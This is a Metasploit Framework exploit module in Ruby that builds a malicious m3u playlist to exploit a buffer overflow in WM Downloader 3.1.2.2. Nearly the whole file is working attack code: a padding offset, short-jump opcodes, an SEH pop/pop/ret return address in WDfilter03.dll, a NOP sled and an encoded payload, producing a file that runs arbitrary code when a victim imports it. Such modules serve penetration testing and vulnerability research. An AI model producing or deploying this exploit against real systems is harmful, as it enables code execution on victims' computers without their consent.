##
# $Id: wm_downloader_m3u.rb 9968 2010-08-07 00:51:52Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WM Downloader 3.1.2.2 Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in WM Downloader v3.1.2.2. When
				the application is used to import a specially crafted m3u file, a buffer overflow occurs
				allowing arbitrary code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'fdisk', 	# Original Exploit
					'dookie'	# MSF Module
				],
			'Version'        => '$Revision: 9968 $',
			'References'     =>
				[
					[ 'OSVDB', '66911'],
					[ 'URL', 'http://www.exploit-db.com/exploits/14497/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x09\x0a",
					'StackAdjustment' => -3500
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x1001060C, 'Offset' => 43480 } ],	# p/p/r in WDfilter03.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 28 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),
			], self.class)

	end

	def exploit

		sploit = rand_text_alpha_upper(43480)	# Offset for WinXP
		sploit << "\xeb\x20\x90\x90"		# Jump to the nops after the 2nd offset
		sploit << [target.ret].pack('V')	# Offset
		sploit << rand_text_alpha_upper(16)	# Pad to reach the Win7 Offset
		sploit << "\xeb\x0C\x90\x90" 		# Jump over the cruft
		sploit << [target.ret].pack('V')	# Offset
		sploit << "\x90" * 8
		sploit << payload.encoded
			
		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)
		
	end

end
